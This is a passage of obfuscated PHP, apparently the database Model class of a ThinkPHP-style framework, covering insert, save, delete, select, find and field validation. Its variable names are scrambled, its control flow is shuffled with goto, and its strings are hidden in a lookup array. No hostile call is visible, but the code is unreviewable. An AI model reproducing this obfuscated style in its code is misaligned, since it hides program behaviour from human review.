$this->_parseOptions($b‚áÌ¶Ê); $cÉŠ†èÎÖó = $this->_facade($cÉŠ†èÎÖó); goto b¨ä·ò×´; fòÎ´¦•¢š: } protected function _beforeInsert(&$cîÒ’¡ŠÌ, $fæÍ‚ÀÓ´İ) { } protected function _after_insert($C—š½æÖËæ, $B£èÅÜ§ù‹) { } public function addAll($Cì™Öá†¡¹, $fğÍØ…Àøó = array(), $a¡Œ¥á˜ = false) { goto DóäˆëğÆ“; Aù•¼ùõ†ì: foreach ($Cì™Öá†¡¹ as $e¨Šİ·£äğ => $A¹ÆŒ¡©¥À) { $Cì™Öá†¡¹[$e¨Šİ·£äğ] = $this->_facade($A¹ÆŒ¡©¥À); } if (method_exists($this->db, $CöïééÚğ[268])) { $dÀ‡Ú†Éõˆ = $this->db->insertAll($Cì™Öá†¡¹, $fğÍØ…Àøó, $a¡Œ¥á˜); } else { $this->startTrans(); foreach ($Cì™Öá†¡¹ as $e¨Šİ·£äğ => $A¹ÆŒ¡©¥À) { $dÀ‡Ú†Éõˆ = $this->db->insert($A¹ÆŒ¡©¥À, $fğÍØ…Àøó, $a¡Œ¥á˜); } $this->commit(); } if (!1 !== $dÀ‡Ú†Éõˆ) { $d äà„Ï²› = $this->getLastInsID(); if ($d äà„Ï²›) { return $d äà„Ï²›; } } goto dßé¥¸¬òä; DóäˆëğÆ“: $CöïééÚğ =& $_SERVER[ç]; if (empty($Cì™Öá†¡¹)) { $this->error = think_lang($CöïééÚğ[267]); return !1; } $fğÍØ…Àøó = $this->_parseOptions($fğÍØ…Àøó); goto Aù•¼ùõ†ì; dßé¥¸¬òä: return $dÀ‡Ú†Éõˆ; goto C£ˆÏ†¢Ø¤; C£ˆÏ†¢Ø¤: } public function selectAdd($a”ë±¥ˆÀ„ = '', $d‹·±Âˆ×Ò = '', $A¢¬Š°´ìœ = array()) { $b‚øÌ¦´ë =& $_SERVER[ç]; $A¢¬Š°´ìœ = $this->_parseOptions($A¢¬Š°´ìœ); if (!1 === ($E‰Ÿ±åØ¼ = $this->db->selectInsert($a”ë±¥ˆÀ„ ? $a”ë±¥ˆÀ„ : $A¢¬Š°´ìœ[$b‚øÌ¦´ë[269]], $d‹·±Âˆ×Ò ? $d‹·±Âˆ×Ò : $this->getTableName(), $A¢¬Š°´ìœ))) { $this->error = think_lang($b‚øÌ¦´ë[270]); return !1; } else { return $E‰Ÿ±åØ¼; } } public function save($C«ÎïœŠ’— = '', $Bêœô®³×² = array()) { goto E¿”¬İö¹; D¤×Îç‹Ø: $Bêœô®³×² = $this->_parseOptions($Bêœô®³×²); $F´½î¯‡ñ = $this->getPk(); if (!isset($Bêœô®³×²[$aÁÕ–‘Ø‡Ä[271]])) { if (isset($C«ÎïœŠ’—[$F´½î¯‡ñ])) { $aßáè‚¼ìˆ[$F´½î¯‡ñ] = $C«ÎïœŠ’—[$F´½î¯‡ñ]; $Bêœô®³×²[$aÁÕ–‘Ø‡Ä[271]] = $aßáè‚¼ìˆ; unset($C«ÎïœŠ’—[$F´½î¯‡ñ]); } else { $this->error = think_lang($aÁÕ–‘Ø‡Ä[270]); return !1; } } goto f‚âİÒ‡´Š; E¿”¬İö¹: $aÁÕ–‘Ø‡Ä =& $_SERVER[ç]; if (empty($C«ÎïœŠ’—)) { if (!empty($this->data)) { $C«ÎïœŠ’— = $this->data; $this->data = array(); } else { $this->error = think_lang($aÁÕ–‘Ø‡Ä[267]); return !1; } } $C«ÎïœŠ’— = $this->_facade($C«ÎïœŠ’—); goto D¤×Îç‹Ø; fé×È“ßäô: if (!1 !== $A‚ù‰‰ÉÙª) { if (isset($Cœî½˜çÇ)) { $C«ÎïœŠ’—[$F´½î¯‡ñ] = $Cœî½˜çÇ; } $this->_afterUpdate($C«ÎïœŠ’—, $Bêœô®³×²); } return $A‚ù‰‰ÉÙª; goto bëÚóÅÃ; f‚âİÒ‡´Š: if (is_array($Bêœô®³×²[$aÁÕ–‘Ø‡Ä[271]]) && isset($Bêœô®³×²[$aÁÕ–‘Ø‡Ä[271]][$F´½î¯‡ñ])) { $Cœî½˜çÇ = $Bêœô®³×²[$aÁÕ–‘Ø‡Ä[271]][$F´½î¯‡ñ]; } if (!1 === $this->_beforeUpdate($C«ÎïœŠ’—, $Bêœô®³×²)) { return !1; } $A‚ù‰‰ÉÙª = $this->db->update($C«ÎïœŠ’—, $Bêœô®³×²); goto fé×È“ßäô; bëÚóÅÃ: } protected function _beforeUpdate(&$AŞ²ãŞÍ™İ, $A¾¨…Îº­£) { } protected function _afterUpdate($fã°ÕƒÛù, $EÍ“³”±Í¦) { } public function delete($b­ÂèÍ±¨¶ = array()) { goto bÎÚ‡³£â‚; eÑ®¥ÙøèÄ: $fÚ‡‰ÕöŠš = $this->db->delete($b­ÂèÍ±¨¶); if (!1 !== $fÚ‡‰ÕöŠš) { $A¾Éà¡÷ÖÂ = array(); if (isset($b„ˆÚóƒ³)) { $A¾Éà¡÷ÖÂ[$cª£§¤ÒŒÇ] = $b„ˆÚóƒ³; } $this->_after_delete($A¾Éà¡÷ÖÂ, $b­ÂèÍ±¨¶); } return $fÚ‡‰ÕöŠš; goto AÇŠª£´É; A¸ÍöóáôÎ: if (is_numeric($b­ÂèÍ±¨¶) || is_string($b­ÂèÍ±¨¶)) { if (strpos($b­ÂèÍ±¨¶, $d‰¶İ×š¾æ[47])) { $AŒ£›°®˜[$cª£§¤ÒŒÇ] = array($d‰¶İ×š¾æ[272], $b­ÂèÍ±¨¶); } else { $AŒ£›°®˜[$cª£§¤ÒŒÇ] = $b­ÂèÍ±¨¶; } $this->options[$d‰¶İ×š¾æ[271]] = $AŒ£›°®˜; } $b­ÂèÍ±¨¶ = $this->_parseOptions(); if (is_array($b­ÂèÍ±¨¶[$d‰¶İ×š¾æ[271]]) && isset($b­ÂèÍ±¨¶[$d‰¶İ×š¾æ[271]][$cª£§¤ÒŒÇ])) { $b„ˆÚóƒ³ = $b­ÂèÍ±¨¶[$d‰¶İ×š¾æ[271]][$cª£§¤ÒŒÇ]; } goto eÑ®¥ÙøèÄ; bÎÚ‡³£â‚: $d‰¶İ×š¾æ =& $_SERVER[ç]; if (empty($b­ÂèÍ±¨¶) && empty($this->options[$d‰¶İ×š¾æ[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $cª£§¤ÒŒÇ = $this->getPk(); goto A¸ÍöóáôÎ; AÇŠª£´É: } protected function _after_delete($aî‚Æº¯ù, $e†öÃ†ÜËŒ) { } public function select($F•²ë™ë½” = array()) { goto fë×ã£¬Äå; fë×ã£¬Äå: $Aà¿³æ½•Û =& $_SERVER[ç]; if (is_string($F•²ë™ë½”) || is_numeric($F•²ë™ë½”)) { $DÌã‚‚â„½ = $this->getPk(); if (strpos($F•²ë™ë½”, $Aà¿³æ½•Û[47])) { $eÇ­¼èìŸ[$DÌã‚‚â„½] = array($Aà¿³æ½•Û[272], $F•²ë™ë½”); } else { $eÇ­¼èìŸ[$DÌã‚‚â„½] = $F•²ë™ë½”; } $this->options[$Aà¿³æ½•Û[271]] = $eÇ­¼èìŸ; } elseif (!1 === $F•²ë™ë½”) { $F•²ë™ë½” = $this->_parseOptions(); return $Aà¿³æ½•Û[273] . $this->db->buildSelectSql($F•²ë™ë½”) . $Aà¿³æ½•Û[274]; } $F•²ë™ë½” = $this->_parseOptions(); goto C‘öŸÚŞ·; AïùÌöÄ¨: $this->_afterSelect($CË«ê‚­¬ô, $F•²ë™ë½”); return $CË«ê‚­¬ô; goto F­í¨¤šÄœ; C‘öŸÚŞ·: $CË«ê‚­¬ô = $this->db->select($F•²ë™ë½”); if (!1 === $CË«ê‚­¬ô) { return !1; } if (empty($CË«ê‚­¬ô)) { return null; } goto AïùÌöÄ¨; F­í¨¤šÄœ: } protected function _afterSelect(&$E ˜ÎæìÊ, $C²¾Š¿Øæ) { } public function buildSql($cÅ™Û¡ä… = array()) { $D¦”Ù™—¿‚ =& $_SERVER[ç]; $cÅ™Û¡ä… = $this->_parseOptions($cÅ™Û¡ä…); return $D¦”Ù™—¿‚[273] . $this->db->buildSelectSql($cÅ™Û¡ä…) . $D¦”Ù™—¿‚[274]; } public function optionsValue($cœ«ˆƒ¾µÌ = null) { if (is_null($cœ«ˆƒ¾µÌ)) { return $this->options; } elseif (is_array($cœ«ˆƒ¾µÌ)) { $this->options = array_merge($this->options, $cœ«ˆƒ¾µÌ); } } protected function _parseOptions($DËÜèó×¦ = array()) { goto c’‚åÄÈè¬; AíÊÉ„«åŸ: if (!isset($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[275]])) { $DËÜèó×¦[$Bˆ™÷ƒšĞ˜[275]] = $this->getTableName(); $aÎø‹¨ƒá¯ = $this->fields; } else { $aÎø‹¨ƒá¯ = $this->getDbFields(); } if (!empty($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[276]])) { $DËÜèó×¦[$Bˆ™÷ƒšĞ˜[275]] .= $Bˆ™÷ƒšĞ˜[50] . $DËÜèó×¦[$Bˆ™÷ƒšĞ˜[276]]; } $DËÜèó×¦[$Bˆ™÷ƒšĞ˜[277]] = $this->name; goto DÅ«”„«Ç; c’‚åÄÈè¬: $Bˆ™÷ƒšĞ˜ =& $_SERVER[ç]; if (is_array($DËÜèó×¦)) { $DËÜèó×¦ = array_merge($this->options, $DËÜèó×¦); } $this->options = array(); goto AíÊÉ„«åŸ; DÅ«”„«Ç: if (isset($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[271]]) && is_array($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[271]]) && !empty($aÎø‹¨ƒá¯) && !isset($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[278]]) && !isset($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[275]])) { foreach ($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[271]] as $B‡’°È³‡­ => $c‰¸Àáµù) { $B‡’°È³‡­ = trim($B‡’°È³‡­); if (in_array($B‡’°È³‡­, $aÎø‹¨ƒá¯, !0)) { if (is_scalar($c‰¸Àáµù)) { $this->_parseType($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[271]], $B‡’°È³‡­); } } elseif (!is_numeric($B‡’°È³‡­) && $Bˆ™÷ƒšĞ˜[70] != substr($B‡’°È³‡­, 0, 1) && !1 === strpos($B‡’°È³‡­, $Bˆ™÷ƒšĞ˜[94]) && !1 === strpos($B‡’°È³‡­, $Bˆ™÷ƒšĞ˜[256]) && !1 === strpos($B‡’°È³‡­, $Bˆ™÷ƒšĞ˜[279]) && !1 === strpos($B‡’°È³‡­, $Bˆ™÷ƒšĞ˜[280])) { unset($DËÜèó×¦[$Bˆ™÷ƒšĞ˜[271]][$B‡’°È³‡­]); } } } $this->_options_filter($DËÜèó×¦); return $DËÜèó×¦; goto Bø³ñÙöˆ—; Bø³ñÙöˆ—: } protected function _options_filter(&$bëé‹‹‚£ù) { } protected function _parseType(&$bËÍÅ¤ì¥À, $A»Ó½ÅµùØ) { $fÒšÇĞêñˆ =& $_SERVER[ç]; if (empty($this->options[$fÒšÇĞêñˆ[281]][$fÒšÇĞêñˆ[4] . $A»Ó½ÅµùØ])) { $D¯»ŸÑÜíÀ = strtolower($this->fields[$fÒšÇĞêñˆ[248]][$A»Ó½ÅµùØ]); if (!1 !== strpos($D¯»ŸÑÜíÀ, $fÒšÇĞêñˆ[282])) { } elseif (!1 === strpos($D¯»ŸÑÜíÀ, $fÒšÇĞêñˆ[283]) && !1 !== strpos($D¯»ŸÑÜíÀ, $fÒšÇĞêñˆ[284])) { $bËÍÅ¤ì¥À[$A»Ó½ÅµùØ] = intval($bËÍÅ¤ì¥À[$A»Ó½ÅµùØ]); } elseif (!1 !== strpos($D¯»ŸÑÜíÀ, $fÒšÇĞêñˆ[285]) || !1 !== strpos($D¯»ŸÑÜíÀ, $fÒšÇĞêñˆ[286])) { $bËÍÅ¤ì¥À[$A»Ó½ÅµùØ] = floatval($bËÍÅ¤ì¥À[$A»Ó½ÅµùØ]); } elseif (!1 !== strpos($D¯»ŸÑÜíÀ, $fÒšÇĞêñˆ[287])) { $bËÍÅ¤ì¥À[$A»Ó½ÅµùØ] = (bool) $bËÍÅ¤ì¥À[$A»Ó½ÅµùØ]; } } } public function find($eï‚ğ–·’Á = array()) { goto e¢°–Ñ¥Ê†; e¢°–Ñ¥Ê†: $bà–ÑïöÁá =& $_SERVER[ç]; if (is_numeric($eï‚ğ–·’Á) || is_string($eï‚ğ–·’Á)) { $b¶—ÜªØ’Ş[$this->getPk()] = intval($eï‚ğ–·’Á); $this->options[$bà–ÑïöÁá[271]] = $b¶—ÜªØ’Ş; } $this->options[$bà–ÑïöÁá[288]] = 1; goto aø´ÇäÁÂ; aø´ÇäÁÂ: $eï‚ğ–·’Á = $this->_parseOptions(); $cÕ‚£ï–•Ù = $this->db->select($eï‚ğ–·’Á); if (!1 === $cÕ‚£ï–•Ù) { return !1; } goto dï©Â“Š®ã; a¤ÈîÂ°¢„: if (!empty($this->options[$bà–ÑïöÁá[289]])) { return $this->returnResult($this->data, $this->options[$bà–ÑïöÁá[289]]); } return $this->data; goto e—ÏÔöÔ¢; dï©Â“Š®ã: if (empty($cÕ‚£ï–•Ù)) { return null; } $this->data = $cÕ‚£ï–•Ù[0]; $this->_afterFind($this->data, $eï‚ğ–·’Á); goto a¤ÈîÂ°¢„; e—ÏÔöÔ¢: } protected function _afterFind(&$cïÃ …Ÿ…«, $fÄå‡†òÓ”) { } protected function returnResult($dÒÈ´Ê±¬, $Eª•ŒôíÏù = '') { $Aéöˆ„ØÂÀ =& $_SERVER[ç]; if ($Eª•ŒôíÏù) { if (is_callable($Eª•ŒôíÏù)) { return call_user_func($Eª•ŒôíÏù, $dÒÈ´Ê±¬); } switch (strtolower($Eª•ŒôíÏù)) { case $Aéöˆ„ØÂÀ[290]: return json_encode($dÒÈ´Ê±¬); case $Aéöˆ„ØÂÀ[291]: return xml_encode($dÒÈ´Ê±¬); } } return $dÒÈ´Ê±¬; } public function parseFieldsMap($EÔ®•ÙË»À, $aŸä‹£“« = 1) { if (!empty($this->_map)) { foreach ($this->_map as $aÅéğåÃÓ¶ => $B¾‘ë£ Á¬) { if ($aŸä‹£“« == 1) { if (isset($EÔ®•ÙË»À[$B¾‘ë£ Á¬])) { $EÔ®•ÙË»À[$aÅéğåÃÓ¶] = $EÔ®•ÙË»À[$B¾‘ë£ Á¬]; unset($EÔ®•ÙË»À[$B¾‘ë£ Á¬]); } } else { if (isset($EÔ®•ÙË»À[$aÅéğåÃÓ¶])) { $EÔ®•ÙË»À[$B¾‘ë£ Á¬] = $EÔ®•ÙË»À[$aÅéğåÃÓ¶]; unset($EÔ®•ÙË»À[$aÅéğåÃÓ¶]); } } } } return $EÔ®•ÙË»À; } public function setField($d‡İÉ²½Ğ, $C¦Èµ±È§÷ = '') { if (is_array($d‡İÉ²½Ğ)) { $d»Ÿ¼¬¤› = $d‡İÉ²½Ğ; } else { $d»Ÿ¼¬¤›[$d‡İÉ²½Ğ] = $C¦Èµ±È§÷; } return $this->save($d»Ÿ¼¬¤›); } public function setAdd($f¬é‰èàöÛ, $bâˆìæ¾á = 1) { $c¯Á²Šß¬‘ =& $_SERVER[ç]; $F¸²ë¦àƒ¯ = $f¬é‰èàöÛ . $c¯Á²Šß¬‘[292] . $bâˆìæ¾á; if ($bâˆìæ¾á < 0) { $F¸²ë¦àƒ¯ = $f¬é‰èàöÛ . $bâˆìæ¾á; } return $this->setField($f¬é‰èàöÛ, array($c¯Á²Šß¬‘[293], $F¸²ë¦àƒ¯)); } public function getField($C¦ŠáÈ­É‡, $E©·œÉòÆ” = null) { $Aè£¢©Á© =& $_SERVER[ç]; $dæ¼›µº·ç[$Aè£¢©Á©[269]] = $C¦ŠáÈ­É‡; $dæ¼›µº·ç = $this->_parseOptions($dæ¼›µº·ç); $C¦ŠáÈ­É‡ = trim($C¦ŠáÈ­É‡); if (strpos($C¦ŠáÈ­É‡, $Aè£¢©Á©[47])) { if (!isset($dæ¼›µº·ç[$Aè£¢©Á©[288]])) { $dæ¼›µº·ç[$Aè£¢©Á©[288]] = is_numeric($E©·œÉòÆ”) ? $E©·œÉòÆ” : $Aè£¢©Á©[33]; } $eÎâÌ–ÊŒ = $this->db->select($dæ¼›µº·ç); if (!empty($eÎâÌ–ÊŒ)) { goto bµ³‹öìïË; bµ³‹öìïË: $b„Æ‡è½ ° = explode($Aè£¢©Á©[47], $C¦ŠáÈ­É‡); $C¦ŠáÈ­É‡ = array_keys($eÎâÌ–ÊŒ[0]); $dˆ´¹››«Ø = array_shift($C¦ŠáÈ­É‡); goto dÌ¿İÅ˜Ü; dÌ¿İÅ˜Ü: $bëè°á„Ş = array_shift($C¦ŠáÈ­É‡); $Bôâƒã’©Ò = array(); $CªÅ»¶¬˜³ = count($b„Æ‡è½ °); goto aëÁÌÀ·ğì; aëÁÌÀ·ğì: foreach ($eÎâÌ–ÊŒ as $BÇÖçÑ‚Õ) { $C‡ŞÚÌˆæÅ = $BÇÖçÑ‚Õ[$dˆ´¹››«Ø]; if (2 == $CªÅ»¶¬˜³) { $Bôâƒã’©Ò[$C‡ŞÚÌˆæÅ] = $BÇÖçÑ‚Õ[$bëè°á„Ş]; } else { $Bôâƒã’©Ò[$C‡ŞÚÌˆæÅ] = is_string($E©·œÉòÆ”) ? implode($E©·œÉòÆ”, $BÇÖçÑ‚Õ) : $BÇÖçÑ‚Õ; } } return $Bôâƒã’©Ò; goto AˆÎÈ‚Âëõ; AˆÎÈ‚Âëõ: } } else { if (!0 !== $E©·œÉòÆ”) { $dæ¼›µº·ç[$Aè£¢©Á©[288]] = is_numeric($E©·œÉòÆ”) ? $E©·œÉòÆ” : 1; } if ($E©·œÉòÆ” === $Aè£¢©Á©[251]) { unset($dæ¼›µº·ç[$Aè£¢©Á©[288]]); } $BÇÖçÑ‚Õ = $this->db->select($dæ¼›µº·ç); if (!empty($BÇÖçÑ‚Õ)) { if ($E©·œÉòÆ” === $Aè£¢©Á©[251]) { return reset($BÇÖçÑ‚Õ[0]); } if (!0 !== $E©·œÉòÆ” && 1 == $dæ¼›µº·ç[$Aè£¢©Á©[288]]) { return reset($BÇÖçÑ‚Õ[0]); } foreach ($BÇÖçÑ‚Õ as $E÷‹ñÜœÙë) { $C—á¯îßÎ[] = $E÷‹ñÜœÙë[$C¦ŠáÈ­É‡]; } return $C—á¯îßÎ; } } return null; } public function create($DĞ´Ù¤ÄÌ = '', $aï‡Ìçö = '') { goto BáºÆ²±½Ä; Eñåø‡šºó: if ($this->autoCheckFields) { $EäìõÕš§í = $this->getDbFields(); foreach ($DĞ´Ù¤ÄÌ as $fàËÛ¿×²‰ => $CíÃá¯Ä´Â) { if (!in_array($fàËÛ¿×²‰, $EäìõÕš§í)) { unset($DĞ´Ù¤ÄÌ[$fàËÛ¿×²‰]); } elseif (MAGIC_QUOTES_GPC && is_string($CíÃá¯Ä´Â)) { $DĞ´Ù¤ÄÌ[$fàËÛ¿×²‰] = stripslashes($CíÃá¯Ä´Â); } } } $this->autoOperation($DĞ´Ù¤ÄÌ, $aï‡Ìçö); $this->data = $DĞ´Ù¤ÄÌ; goto B»Õ´ÅÂ„ì; B»Õ´ÅÂ„ì: return $DĞ´Ù¤ÄÌ; goto F…¯İŠ«; BáºÆ²±½Ä: $dÕàå…Óƒ =& $_SERVER[ç]; if (empty($DĞ´Ù¤ÄÌ)) { $DĞ´Ù¤ÄÌ = $_POST; } elseif (is_object($DĞ´Ù¤ÄÌ)) { $DĞ´Ù¤ÄÌ = get_object_vars($DĞ´Ù¤ÄÌ); } if (empty($DĞ´Ù¤ÄÌ) || !is_array($DĞ´Ù¤ÄÌ)) { $this->error = think_lang($dÕàå…Óƒ[267]); return !1; } goto Fãİˆ”ô; Fãİˆ”ô: $DĞ´Ù¤ÄÌ = $this->parseFieldsMap($DĞ´Ù¤ÄÌ, 0); $aï‡Ìçö = $aï‡Ìçö ? $aï‡Ìçö : (!empty($DĞ´Ù¤ÄÌ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$dÕàå…Óƒ[269]])) { $EäìõÕš§í = $this->options[$dÕàå…Óƒ[269]]; unset($this->options[$dÕàå…Óƒ[269]]); } elseif ($aï‡Ìçö == THINK_MODEL_INSERT && isset($this->insertFields)) { $EäìõÕš§í = $this->insertFields; } elseif ($aï‡Ìçö == THINK_MODEL_UPDATE && isset($this->updateFields)) { $EäìõÕš§í = $this->updateFields; } goto Cá©ø·å‚ä; Cá©ø·å‚ä: if (isset($EäìõÕš§í)) { if (is_string($EäìõÕš§í)) { $EäìõÕš§í = explode($dÕàå…Óƒ[47], $EäìõÕš§í); } if (think_config($dÕàå…Óƒ[294])) { $EäìõÕš§í[] = think_config($dÕàå…Óƒ[295]); } foreach ($DĞ´Ù¤ÄÌ as $fàËÛ¿×²‰ => $CíÃá¯Ä´Â) { if (!in_array($fàËÛ¿×²‰, $EäìõÕš§í)) { unset($DĞ´Ù¤ÄÌ[$fàËÛ¿×²‰]); } } } if (!$this->autoValidation($DĞ´Ù¤ÄÌ, $aï‡Ìçö)) { return !1; } if (!$this->autoCheckToken($DĞ´Ù¤ÄÌ)) { $this->error = think_lang($dÕàå…Óƒ[296]); return !1; } goto Eñåø‡šºó; F…¯İŠ«: } public function autoCheckToken($aÂô‚é…šå) { $B³ƒ³›±Î =& $_SERVER[ç]; if (isset($this->options[$B³ƒ³›±Î[297]]) && !$this->options[$B³ƒ³›±Î[297]]) { return !0; } if (think_config($B³ƒ³›±Î[294])) { $CÜÙÛÚ™ä = think_config($B³ƒ³›±Î[295]); if (!isset($aÂô‚é…šå[$CÜÙÛÚ™ä]) || Session::get($CÜÙÛÚ™ä)) { return !1; } list($B‰Í•áµ», $E“ÉÛèĞÃÒ) = explode($B³ƒ³›±Î[70], $aÂô‚é…šå[$CÜÙÛÚ™ä]); if ($E“ÉÛèĞÃÒ && Session::get($CÜÙÛÚ™ä . $B³ƒ³›±Î[94] . $B‰Í•áµ») === $E“ÉÛèĞÃÒ) { Session::remove($CÜÙÛÚ™ä . $B³ƒ³›±Î[94] . $B‰Í•áµ»); return !0; } if (think_config($B³ƒ³›±Î[298])) { Session::remove($CÜÙÛÚ™ä . $B³ƒ³›±Î[94] . $B‰Í•áµ»); } return !1; } return !0; } public function regex($EÔŒÌò¨›é, $e†„¤ôÄ—«) { $fê“™¤¶Ï® =& $_SERVER[ç]; $fÌáîŒí¹ = array($fê“™¤¶Ï®[299] => $fê“™¤¶Ï®[300], $fê“™¤¶Ï®[301] => $fê“™¤¶Ï®[302], $fê“™¤¶Ï®[303] => $fê“™¤¶Ï®[304], $fê“™¤¶Ï®[305] => $fê“™¤¶Ï®[306], $fê“™¤¶Ï®[307] => $fê“™¤¶Ï®[308], $fê“™¤¶Ï®[309] => $fê“™¤¶Ï®[310], $fê“™¤¶Ï®[311] => $fê“™¤¶Ï®[312], $fê“™¤¶Ï®[286] => $fê“™¤¶Ï®[313], $fê“™¤¶Ï®[314] => $fê“™¤¶Ï®[315]); if (isset($fÌáîŒí¹[strtolower($e†„¤ôÄ—«)])) { $e†„¤ôÄ—« = $fÌáîŒí¹[strtolower($e†„¤ôÄ—«)]; } return preg_match($e†„¤ôÄ—«, $EÔŒÌò¨›é) === 1; } private function autoOperation(&$dÏ¼×©¤£ï, $DÜÑˆİé‡‘) { $C‚§á£¯¹Ï =& $_SERVER[ç]; if (!empty($this->options[$C‚§á£¯¹Ï[316]])) { $DÀœİÄ‹‚ = $this->options[$C‚§á£¯¹Ï[316]]; unset($this->options[$C‚§á£¯¹Ï[316]]); } elseif (!empty($this->_auto)) { $DÀœİÄ‹‚ = $this->_auto; } if (isset($DÀœİÄ‹‚)) { foreach ($DÀœİÄ‹‚ as $D¯ùÊ©è»Ô) { if (empty($D¯ùÊ©è»Ô[2])) { $D¯ùÊ©è»Ô[2] = THINK_MODEL_INSERT; } if ($DÜÑˆİé‡‘ == $D¯ùÊ©è»Ô[2] || $D¯ùÊ©è»Ô[2] == THINK_MODEL_BOTH) { switch (trim($D¯ùÊ©è»Ô[3])) { case $C‚§á£¯¹Ï[317]: case $C‚§á£¯¹Ï[318]: $Fô˜‰ŠÈÀ¢ = isset($D¯ùÊ©è»Ô[4]) ? (array) $D¯ùÊ©è»Ô[4] : array(); if (isset($dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]])) { array_unshift($Fô˜‰ŠÈÀ¢, $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]]); } if ($C‚§á£¯¹Ï[317] == $D¯ùÊ©è»Ô[3]) { $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]] = call_user_func_array($D¯ùÊ©è»Ô[1], $Fô˜‰ŠÈÀ¢); } else { $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]] = call_user_func_array(array(&$this, $D¯ùÊ©è»Ô[1]), $Fô˜‰ŠÈÀ¢); } break; case $C‚§á£¯¹Ï[269]: $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]] = $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[1]]; break; case $C‚§á£¯¹Ï[319]: if ($C‚§á£¯¹Ï[33] === $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]]) { unset($dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]]); } break; case $C‚§á£¯¹Ï[320]: default: $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]] = $D¯ùÊ©è»Ô[1]; } if (!1 === $dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]]) { unset($dÏ¼×©¤£ï[$D¯ùÊ©è»Ô[0]]); } } } } return $dÏ¼×©¤£ï; } protected function autoValidation($d¹ö’Æ×Î, $a •Ëˆ“‹ù) { $d¼Âê‰Ö× =& $_SERVER[ç]; if (!empty($this->options[$d¼Âê‰Ö×[321]])) { $Câ¬¸…‘Š„ = $this->options[$d¼Âê‰Ö×[321]]; unset($this->options[$d¼Âê‰Ö×[321]]); } elseif (!empty($this->_validate)) { $Câ¬¸…‘Š„ = $this->_validate; } if (isset($Câ¬¸…‘Š„)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Câ¬¸…‘Š„ as $e‡—æœÙÌä => $báİš¹æ¬) { if (empty($báİš¹æ¬[5]) || $báİš¹æ¬[5] == THINK_MODEL_BOTH || $báİš¹æ¬[5] == $a •Ëˆ“‹ù) { if (0 == strpos($báİš¹æ¬[2], $d¼Âê‰Ö×[322]) && strpos($báİš¹æ¬[2], $d¼Âê‰Ö×[323])) { $báİš¹æ¬[2] = think_lang(substr($báİš¹æ¬[2], 2, -1)); } $báİš¹æ¬[3] = isset($báİš¹æ¬[3]) ? $báİš¹æ¬[3] : THINK_EXISTS_VALIDATE; $báİš¹æ¬[4] = isset($báİš¹æ¬[4]) ? $báİš¹æ¬[4] : $d¼Âê‰Ö×[324]; switch ($báİš¹æ¬[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($d¹ö’Æ×Î, $báİš¹æ¬)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($d¼Âê‰Ö×[33] != trim($d¹ö’Æ×Î[$báİš¹æ¬[0]])) { if (!1 === $this->_validationField($d¹ö’Æ×Î, $báİš¹æ¬)) { return !1; } } break; default: if (isset($d¹ö’Æ×Î[$báİš¹æ¬[0]])) { if (!1 === $this->_validationField($d¹ö’Æ×Î, $báİš¹æ¬)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Cïºù™¶²ê, $BÍ—šÛÆô) { if (!1 === $this->_validationFieldItem($Cïºù™¶²ê, $BÍ—šÛÆô)) { if ($this->patchValidate) { $this->error[$BÍ—šÛÆô[0]] = $BÍ—šÛÆô[2]; } else { $this->error = $BÍ—šÛÆô[2]; return !1; } } return; } protected function _validationFieldItem($fÏ¦’Ù—Š, $eœõïíƒÛ) { $C÷à°›§Î =& $_SERVER[ç]; switch (strtolower(trim($eœõïíƒÛ[4]))) { case $C÷à°›§Î[317]: case $C÷à°›§Î[318]: $fìº¯‰º„é = isset($eœõïíƒÛ[6]) ? (array) $eœõïíƒÛ[6] : array(); if (is_string($eœõïíƒÛ[0]) && strpos($eœõïíƒÛ[0], $C÷à°›§Î[47])) { $eœõïíƒÛ[0] = explode($C÷à°›§Î[47], $eœõïíƒÛ[0]); } if (is_array($eœõïíƒÛ[0])) { foreach ($eœõïíƒÛ[0] as $Bİ·ÅöÏĞ¶) { $D°øá×¬¬Ğ[$Bİ·ÅöÏĞ¶] = $fÏ¦’Ù—Š[$Bİ·ÅöÏĞ¶]; } array_unshift($fìº¯‰º„é, $D°øá×¬¬Ğ); } else { array_unshift($fìº¯‰º„é, $fÏ¦’Ù—Š[$eœõïíƒÛ[0]]); } if ($C÷à°›§Î[317] == $eœõïíƒÛ[4]) { return call_user_func_array($eœõïíƒÛ[1], $fìº¯‰º„é); } else { return call_user_func_array(array(&$this, $eœõïíƒÛ[1]), $fìº¯‰º„é); } case $C÷à°›§Î[325]: return $fÏ¦’Ù—Š[$eœõïíƒÛ[0]] == $fÏ¦’Ù—Š[$eœõïíƒÛ[1]]; case $C÷à°›§Î[326]: if (is_string($eœõïíƒÛ[0]) && strpos($eœõïíƒÛ[0], $C÷à°›§Î[47])) { $eœõïíƒÛ[0] = explode($C÷à°›§Î[47], $eœõïíƒÛ[0]); } $Aù¹â‚«¹ì = array(); if (is_array($eœõïíƒÛ[0])) { foreach ($eœõïíƒÛ[0] as $Bİ·ÅöÏĞ¶) { $Aù¹â‚«¹ì[$Bİ·ÅöÏĞ¶] = $fÏ¦’Ù—Š[$Bİ·ÅöÏĞ¶]; } } else { 